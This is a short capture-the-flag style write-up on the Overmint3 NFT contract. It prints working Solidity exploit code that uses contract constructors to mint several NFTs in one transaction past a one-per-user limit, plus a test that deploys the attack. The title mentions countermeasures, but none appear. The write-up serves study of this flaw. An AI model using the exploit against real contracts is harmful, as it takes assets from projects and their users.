# Title: Overminting NFTs in One Transaction: Exploit and Countermeasures

# Description:

The Overmint3 smart contract has a vulnerability that enables an attacker to obtain multiple NFTs within a single transaction, bypassing the intended limit of one NFT per user. This issue stems from insufficient checks during the minting process.

# Exploit:

An attacker can craft a smart contract (BatchNFTMinter) which, when deployed, instantiates multiple instances of another contract (IndividualNFTMinter).

```solidity
contract BatchNFTMinter {
    Overmint3 target;
    uint256 attackCounter = 1;

    constructor(address _target, address _player) {
        target = Overmint3(_target);
        while (attackCounter < 6) {
            attackCounter++;
            new IndividualNFTMinter(_target, _player);
        }
    }
}

contract IndividualNFTMinter {
    Overmint3 target;

    constructor(address _target, address _player) {
        target = Overmint3(_target);
        target.mint();
        target.safeTransferFrom(address(this), _player, target.totalSupply());
    }
}

```

Each IndividualNFTMinter contract instance then mints a new NFT from the Overmint3 contract and transfers it to the attacker's wallet address. As the minting and transfer take place within the constructor of the IndividualNFTMinter contract, the whole operation occurs in just one transaction.

```solidity
it("conduct your attack here", async function () {
  const BatchNFTMinterFactory = await ethers.getContractFactory(
    "BatchNFTMinter",
    attackerWallet
  );
  await BatchNFTMinterFactory.deploy(
    victimContract.address,
    attackerWallet.address
  );
});


```
